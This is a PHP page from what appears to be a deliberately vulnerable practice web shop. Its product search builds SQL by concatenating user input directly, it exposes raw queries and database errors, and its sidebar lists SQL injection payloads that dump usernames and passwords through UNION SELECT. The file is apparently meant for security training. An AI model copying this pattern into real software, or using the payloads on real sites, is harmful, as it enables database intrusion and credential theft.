<?php
ob_start();
require_once 'config.php';

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

// Get search parameter - VULNERABLE to SQL Injection
$search = $_GET['search'] ?? '';
$category = $_GET['category'] ?? '';

$title = 'Products';
include 'header.php';
?> <div class="row"> <div class="col-md-3"> <div class="card"> <div class="card-header"> <h5> Search Products</h5> </div> <div class="card-body"> <!-- VULNERABLE: No CSRF protection, direct parameter usage --> <form method="GET" action="products.php"> <div class="mb-3"> <label for="search" class="form-label">Search</label> <input type="text" class="form-control" id="search" name="search" 
                               value="<?php echo htmlspecialchars($search); ?>" 
                               placeholder="Enter product name..."> </div> <div class="mb-3"> <label for="category" class="form-label">Category</label> <select class="form-control" id="category" name="category"> <option value="">All Categories</option> <option value="Electronics" <?php echo $category === 'Electronics' ? 'selected' : ''; ?>>Electronics</option> <option value="Home" <?php echo $category === 'Home' ? 'selected' : ''; ?>>Home</option> </select> </div> <button type="submit" class="btn btn-primary btn-sm">Search</button> <a href="products.php" class="btn btn-outline-secondary btn-sm">Clear</a> </form> <hr> <div class="alert alert-danger p-2"> <h6 class="mb-1"> SQL Injection Testing</h6> <p class="mb-1 small">Table <strong>products</strong> has 6 cols:<br> <code style="font-size:.7rem;">id, name, description, price, category, created_at</code> </p> <div class="mb-1"> <span class="badge bg-dark mb-1">1. Return all rows</span> <div class="bg-light rounded p-1" style="word-break:break-all;font-size:.72rem;"> <code>' OR '1'='1'-- -</code> </div> <small class="text-muted">Looks same as default — all products shown</small> </div> <div class="mb-1"> <span class="badge bg-dark mb-1">2. Dump credentials</span> <div class="bg-light rounded p-1" style="word-break:break-all;font-size:.72rem;"> <code>' UNION SELECT 1,username,password,4,5,6 FROM users-- -</code> </div> <small class="text-muted">Shows username/password as product rows</small> </div> <div class="mb-1"> <span class="badge bg-dark mb-1">3. Dump only (no products)</span> <div class="bg-light rounded p-1" style="word-break:break-all;font-size:.72rem;"> <code>' AND 1=2 UNION SELECT NULL,concat(username,':',password),NULL,NULL,NULL,NULL FROM users-- -</code> </div> <small class="text-muted">Hides real products, shows user:pass only</small> </div> <p class="mb-0 small"> Append <code>?debug=1</code> to URL to see raw SQL.</p> </div> </div> </div> </div> <div class="col-md-9"> <div class="d-flex justify-content-between align-items-center mb-3"> <h3> Products</h3> <?php if (isLoggedIn()): ?> <a href="add_product.php" class="btn btn-success">Add Product</a> <?php endif; ?> </div> <?php
        $conn = getConnection();
        
        // VULNERABLE: SQL Injection - Direct string concatenation without escaping
        $query = "SELECT * FROM products WHERE 1=1";
        
        if (!empty($search)) {
            // EXTREMELY VULNERABLE: Direct injection of user input
            $query .= " AND name LIKE '%$search%'";
        }
        
        if (!empty($category)) {
            $query .= " AND category = '$category'";
        }
        
        $query .= " ORDER BY created_at DESC";
        
        // Show query in debug mode - VULNERABLE: Information disclosure
        if (isset($_GET['debug'])) {
            echo "<div class='alert alert-info'><strong>Query:</strong> <code>$query</code></div>";
        }
        
        $result = $conn->query($query);
        
        if (!$result) {
            // VULNERABLE: Database error disclosure
            echo "<div class='alert alert-danger'>Database Error: " . $conn->error . "</div>";
        } else {
            if ($result->num_rows === 0) {
                echo "<div class='alert alert-warning'>No products found matching your criteria.</div>";
            } else {
                echo "<div class='row'>";
                
                while ($product = $result->fetch_assoc()) {
                    ?> <div class="col-md-6 mb-4"> <div class="card"> <div class="card-header"> <h5 class="card-title mb-0"><?php echo htmlspecialchars($product['name']); ?></h5> <small class="text-muted"><?php echo htmlspecialchars($product['category']); ?></small> </div> <div class="card-body"> <p class="card-text"><?php echo htmlspecialchars($product['description']); ?></p> <p class="text-primary"> <strong>Price: $<?php echo number_format($product['price'], 2, '.', ','); ?></strong> </p> <div class="btn-group" role="group"> <a href="product_detail.php?id=<?php echo $product['id']; ?>" class="btn btn-primary btn-sm">View Details</a> <?php if (isLoggedIn()): ?> <a href="add_to_cart.php?product_id=<?php echo $product['id']; ?>" class="btn btn-success btn-sm">Add to Cart</a> <?php endif; ?> </div> </div> <div class="card-footer text-muted"> Created: <?php echo date('M j, Y', strtotime($product['created_at'])); ?> </div> </div> </div> <?php
                }
                
                echo "</div>";
            }
        }
        ?> <?php if (isset($_GET['debug'])): ?> <div class="alert alert-secondary mt-4"> <h5> Debug Information</h5> <p><strong>Search Parameters:</strong></p> <pre><?php print_r($_GET); ?></pre> <p><strong>SQL Query:</strong></p> <pre><?php echo $query; ?></pre> <?php if (isset($result) && $result): ?> <p><strong>Result Count:</strong> <?php echo $result->num_rows; ?></p> <?php endif; ?> </div> <?php endif; ?> </div>
</div> <?php include 'footer.php'; ?>